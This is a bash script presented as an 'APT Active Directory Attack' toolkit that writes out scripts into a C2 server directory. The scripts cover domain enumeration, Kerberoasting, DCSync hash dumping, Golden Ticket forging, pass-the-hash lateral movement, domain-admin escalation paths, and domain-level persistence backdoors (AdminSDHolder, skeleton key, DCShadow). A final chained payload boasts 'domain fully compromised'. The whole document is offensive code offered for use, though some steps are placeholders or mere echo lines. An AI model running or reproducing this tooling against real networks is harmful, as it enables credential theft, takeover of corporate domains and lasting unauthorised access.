#!/bin/bash
# ============================================
# APT ACTIVE DIRECTORY ATTACK v1.0
# Golden Ticket | DCSync | Kerberoast | Domain Admin
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

AD_DIR="$HOME/c2_server/modules/corporate/ad_attack"
PAYLOAD_DIR="$HOME/c2_server/payloads"
LOG_DIR="$HOME/c2_server/logs"

mkdir -p "$AD_DIR" "$PAYLOAD_DIR" "$LOG_DIR"

# === AD ENUMERATOR ===
generate_ad_enumerator() {
    echo -e "\n${CYAN}[AD Enumeration Script]${NC}"
    
    cat > "$AD_DIR/ad_enum.sh" << 'ADENUM'
#!/bin/bash
# ACTIVE DIRECTORY ENUMERATOR
# Maps entire corporate network

echo "[*] Enumerating Active Directory..."

# Find Domain Controller
echo "  [*] Finding Domain Controllers..."
nslookup -type=SRV _ldap._tcp.dc._msdcs. 2>/dev/null | grep -E "server|internet address" | while read line; do
    echo "  [+] DC: $line"
done

# Get domain name
DOMAIN=$(dnsdomainname 2>/dev/null || hostname -d 2>/dev/null)
echo "  [+] Domain: ${DOMAIN:-Unknown}"

# Get domain SID
echo "  [*] Getting Domain SID..."
rpcclient -U% -c "lsaquery" DC_IP 2>/dev/null | grep "Domain Sid" | while read sid; do
    echo "  [+] Domain SID: $sid"
done

# Enumerate users
echo "  [*] Enumerating domain users..."
ldapsearch -x -h DC_IP -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}' | while read user; do
    echo "  👤 $user"
done

# Enumerate groups
echo "  [*] Enumerating domain groups..."
ldapsearch -x -h DC_IP -b "dc=domain,dc=com" "(objectClass=group)" cn 2>/dev/null | grep "cn:" | awk '{print $2}' | while read group; do
    echo "  👥 $group"
done

# Enumerate computers
echo "  [*] Enumerating domain computers..."
ldapsearch -x -h DC_IP -b "dc=domain,dc=com" "(objectClass=computer)" cn 2>/dev/null | grep "cn:" | awk '{print $2}' | while read comp; do
    echo "  💻 $comp"
done

echo "[+] AD enumeration complete"
ADENUM
    chmod +x "$AD_DIR/ad_enum.sh"
    echo -e "${GREEN}[+]${NC} AD Enum: $AD_DIR/ad_enum.sh"
}

# === KERBEROAST ATTACK ===
generate_kerberoast() {
    echo -e "\n${CYAN}[Kerberoast Attack Script]${NC}"
    
    cat > "$AD_DIR/kerberoast.sh" << 'KERB'
#!/bin/bash
# KERBEROAST ATTACK
# Extracts service account hashes for cracking

echo "[*] Starting Kerberoast attack..."

DOMAIN="$1"
[ -z "$DOMAIN" ] && { echo "Usage: $0 domain.com"; return 1; }

# Request service tickets
echo "  [*] Requesting service tickets..."

impacket-GetUserSPNs -request -dc-ip DC_IP "$DOMAIN/" 2>/dev/null | while read hash; do
    echo "  [+] Hash: $hash"
done

# Save hashes for cracking
impacket-GetUserSPNs -request -dc-ip DC_IP "$DOMAIN/" -outputfile "$AD_DIR/kerberoast_hashes.txt" 2>/dev/null

echo "[+] Kerberoast hashes saved: $AD_DIR/kerberoast_hashes.txt"
echo "[*] Crack with: hashcat -m 13100 hashes.txt wordlist.txt"
KERB
    chmod +x "$AD_DIR/kerberoast.sh"
    echo -e "${GREEN}[+]${NC} Kerberoast: $AD_DIR/kerberoast.sh"
}

# === DCSYNC ATTACK ===
generate_dcsync() {
    echo -e "\n${CYAN}[DCSync Attack Script]${NC}"
    
    cat > "$AD_DIR/dcsync.sh" << 'DCSYNC'
#!/bin/bash
# DCSYNC ATTACK
# Replicates Domain Controller to extract ALL hashes

echo "[*] Starting DCSync attack..."
echo "[!] Requires: Domain Admin or Replication privileges"

DOMAIN="$1"
USER="$2"
PASS="$3"

# Using secretsdump (impacket)
echo "  [*] Dumping NTDS.dit via DCSync..."

impacket-secretsdump -just-dc-ntlm "$DOMAIN/$USER:$PASS@DC_IP" 2>/dev/null | while read hash; do
    echo "  [+] $hash"
done

# Save all hashes
impacket-secretsdump -just-dc-ntlm "$DOMAIN/$USER:$PASS@DC_IP" \
    -outputfile "$AD_DIR/dcsync_dump" 2>/dev/null

echo "[+] All hashes saved: $AD_DIR/dcsync_dump*"
echo "[!] Contains: KRBTGT hash, Administrator hash, ALL user hashes"
DCSYNC
    chmod +x "$AD_DIR/dcsync.sh"
    echo -e "${GREEN}[+]${NC} DCSync: $AD_DIR/dcsync.sh"
}

# === GOLDEN TICKET GENERATOR ===
generate_golden_ticket() {
    echo -e "\n${CYAN}[Golden Ticket Generator]${NC}"
    
    cat > "$AD_DIR/golden_ticket.sh" << 'GOLDEN'
#!/bin/bash
# GOLDEN TICKET ATTACK
# Creates Kerberos ticket for ANY user (including Domain Admin)

echo "[*] Generating Golden Ticket..."
echo "[!] Requires: KRBTGT hash, Domain SID, Domain Name"

DOMAIN="$1"
DOMAIN_SID="$2"
KRBTGT_HASH="$3"

[ -z "$DOMAIN" ] && {
    echo "Usage: $0 domain.com S-1-5-21-xxx ntlm_hash"
    return 1
}

# Generate Golden Ticket for Administrator
echo "  [*] Creating ticket for: Administrator"

impacket-ticketer \
    -nthash "$KRBTGT_HASH" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -user-id 500 \
    -groups "512,513,518,519,520" \
    Administrator 2>/dev/null

if [ -f "Administrator.ccache" ]; then
    echo "  [+] Golden Ticket created: Administrator.ccache"
    
    # Export ticket
    export KRB5CCNAME="$(pwd)/Administrator.ccache"
    echo "  [+] Ticket exported"
    
    # Test access
    echo "  [*] Testing Domain Admin access..."
    impacket-psexec -k -no-pass "Administrator@DC_IP" "whoami" 2>/dev/null
else
    echo "  [!] Failed to create Golden Ticket"
fi

echo "[+] Golden Ticket attack complete"
GOLDEN
    chmod +x "$AD_DIR/golden_ticket.sh"
    echo -e "${GREEN}[+]${NC} Golden Ticket: $AD_DIR/golden_ticket.sh"
}

# === LATERAL MOVEMENT ===
generate_lateral_movement() {
    echo -e "\n${CYAN}[Lateral Movement Script]${NC}"
    
    cat > "$AD_DIR/lateral_movement.sh" << 'LATERAL'
#!/bin/bash
# LATERAL MOVEMENT ENGINE
# Spreads across corporate network

echo "[*] Starting lateral movement..."

TARGETS_FILE="$1"
[ ! -f "$TARGETS_FILE" ] && { echo "Usage: $0 targets.txt"; return 1; }

while read -r target; do
    echo "  [*] Attacking: $target"
    
    # Method 1: PSExec (if admin)
    echo "      [*] Trying PSExec..."
    impacket-psexec -hashes ":NTLM_HASH" "Administrator@$target" "whoami" 2>/dev/null
    
    # Method 2: WMIExec
    echo "      [*] Trying WMIExec..."
    impacket-wmiexec -hashes ":NTLM_HASH" "Administrator@$target" "whoami" 2>/dev/null
    
    # Method 3: SMBExec
    echo "      [*] Trying SMBExec..."
    impacket-smbexec -hashes ":NTLM_HASH" "Administrator@$target" "whoami" 2>/dev/null
    
    # Method 4: AtExec (schedule task)
    echo "      [*] Trying AtExec..."
    impacket-atexec -hashes ":NTLM_HASH" "Administrator@$target" "whoami" 2>/dev/null
    
    # Method 5: DCOMExec
    echo "      [*] Trying DCOMExec..."
    impacket-dcomexec -hashes ":NTLM_HASH" "Administrator@$target" "whoami" 2>/dev/null
    
done < "$TARGETS_FILE"

echo "[+] Lateral movement complete"
LATERAL
    chmod +x "$AD_DIR/lateral_movement.sh"
    echo -e "${GREEN}[+]${NC} Lateral Movement: $AD_DIR/lateral_movement.sh"
}

# === DOMAIN ADMIN ESCALATION ===
generate_da_escalation() {
    echo -e "\n${CYAN}[Domain Admin Escalation Script]${NC}"
    
    cat > "$AD_DIR/da_escalation.sh" << 'DAESC'
#!/bin/bash
# DOMAIN ADMIN ESCALATION
# Multiple paths to Domain Admin

echo "[*] Attempting Domain Admin escalation..."

# Path 1: Kerberoast → Crack → DA
echo "  [Path 1] Kerberoast → Crack → DA"
bash "$AD_DIR/kerberoast.sh" 2>/dev/null

# Path 2: DCSync → Golden Ticket
echo "  [Path 2] DCSync → Golden Ticket"
bash "$AD_DIR/dcsync.sh" 2>/dev/null

# Path 3: NTLM Relay
echo "  [Path 3] NTLM Relay Attack"
echo "  [*] Setup: impacket-ntlmrelayx -tf targets.txt -smb2support"
echo "  [*] Trigger: Responder -I eth0"

# Path 4: Print Spooler (PrintNightmare)
echo "  [Path 4] Print Spooler Attack"
echo "  [*] Check: rpcdump.py @DC_IP | grep MS-RPRN"
echo "  [*] Exploit: impacket-rpcdump @DC_IP | grep -A 6 'MS-RPRN'"

# Path 5: PetitPotam (NTLM coercion)
echo "  [Path 5] PetitPotam Attack"
echo "  [*] Attack: python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS LISTENER_IP DC_IP"

echo "[+] Escalation paths enumerated"
DAESC
    chmod +x "$AD_DIR/da_escalation.sh"
    echo -e "${GREEN}[+]${NC} DA Escalation: $AD_DIR/da_escalation.sh"
}

# === PERSISTENCE (Enterprise) ===
generate_enterprise_persistence() {
    echo -e "\n${CYAN}[Enterprise Persistence Script]${NC}"
    
    cat > "$AD_DIR/enterprise_persist.sh" << 'ENTPERSIST'
#!/bin/bash
# ENTERPRISE PERSISTENCE
# Permanent backdoor at domain level

echo "[*] Installing enterprise persistence..."

# Method 1: Golden Ticket (survives password changes)
echo "  [*] Method 1: Golden Ticket Persistence"
echo "  [+] KRBTGT hash never changes unless double-reset"

# Method 2: AdminSDHolder (auto-reapply admin rights)
echo "  [*] Method 2: AdminSDHolder Backdoor"
cat > /tmp/admin_sd.ldif << 'LDIF'
dn: CN=AdminSDHolder,CN=System,DC=domain,DC=com
changetype: modify
add: ntSecurityDescriptor
ntSecurityDescriptor: D:PAI(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCSWRPWPLO;;;S-1-5-21-xxx-xxx-xxx-500)
LDIF
ldapmodify -x -h DC_IP -D "Administrator@domain.com" -w "password" -f /tmp/admin_sd.ldif 2>/dev/null

# Method 3: Skeleton Key (password: mimikatz for ALL users)
echo "  [*] Method 3: Skeleton Key Attack"
echo "  [+] mimikatz # misc::skeleton"
echo "  [+] Now ANY user can login with password: mimikatz"

# Method 4: DCShadow (register rogue DC)
echo "  [*] Method 4: DCShadow Attack"
echo "  [+] mimikatz # lsadump::dcshadow /object:CN=Administrator /attribute:unicodePwd"

echo "[+] Enterprise persistence installed"
ENTPERSIST
    chmod +x "$AD_DIR/enterprise_persist.sh"
    echo -e "${GREEN}[+]${NC} Enterprise Persist: $AD_DIR/enterprise_persist.sh"
}

# === GENERATE COMBINED PAYLOAD ===
generate_ad_payload() {
    echo -e "\n${CYAN}[Generating AD Attack Payload]${NC}"
    
    cat > "$PAYLOAD_DIR/ad_attack_payload.sh" << 'ADPAYLOAD'
#!/bin/bash
# APT ACTIVE DIRECTORY ATTACK PAYLOAD
# Full domain compromise automation

echo "╔══════════════════════════════════════╗"
echo "║  🏰 AD ATTACK — FULL COMPROMISE    ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Step 1: Enumerate
echo "[1/6] Enumerating Active Directory..."
bash ad_enum.sh 2>/dev/null

# Step 2: Kerberoast
echo "[2/6] Kerberoast attack..."
bash kerberoast.sh 2>/dev/null

# Step 3: Lateral Movement
echo "[3/6] Lateral movement..."
bash lateral_movement.sh targets.txt 2>/dev/null

# Step 4: Escalate to DA
echo "[4/6] Escalating to Domain Admin..."
bash da_escalation.sh 2>/dev/null

# Step 5: DCSync
echo "[5/6] DCSync — Extracting ALL hashes..."
bash dcsync.sh 2>/dev/null

# Step 6: Enterprise Persistence
echo "[6/6] Installing enterprise persistence..."
bash enterprise_persist.sh 2>/dev/null

echo ""
echo "╔══════════════════════════════════════╗"
echo "║  ✅ DOMAIN FULLY COMPROMISED!       ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "Achievements:"
echo "  ✓ All user hashes extracted"
echo "  ✓ Golden Ticket generated"
echo "  ✓ Domain Admin access"
echo "  ✓ Enterprise persistence installed"
echo "  ✓ Survives password changes"
ADPAYLOAD
    chmod +x "$PAYLOAD_DIR/ad_attack_payload.sh"
    echo -e "${GREEN}[+]${NC} AD payload: $PAYLOAD_DIR/ad_attack_payload.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  🏰 AD ATTACK v1.0         ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 🔍 AD Enumeration"
        echo -e "  ${GREEN}2)${NC} 🎯 Kerberoast Attack"
        echo -e "  ${GREEN}3)${NC} 💉 DCSync Attack"
        echo -e "  ${GREEN}4)${NC} 👑 Golden Ticket"
        echo -e "  ${GREEN}5)${NC} ↔️  Lateral Movement"
        echo -e "  ${GREEN}6)${NC} ⬆️  DA Escalation"
        echo -e "  ${GREEN}7)${NC} 🔒 Enterprise Persistence"
        echo -e "  ${GREEN}8)${NC} 📲 Combined Payload"
        echo -e "  ${GREEN}9)${NC} 🚀 Generate ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) generate_ad_enumerator ;;
            2) generate_kerberoast ;;
            3) generate_dcsync ;;
            4) generate_golden_ticket ;;
            5) generate_lateral_movement ;;
            6) generate_da_escalation ;;
            7) generate_enterprise_persistence ;;
            8) generate_ad_payload ;;
            9)
                generate_ad_enumerator
                generate_kerberoast
                generate_dcsync
                generate_golden_ticket
                generate_lateral_movement
                generate_da_escalation
                generate_enterprise_persistence
                generate_ad_payload
                echo -e "\n${GREEN}[+]${NC} All AD attack tools generated!"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
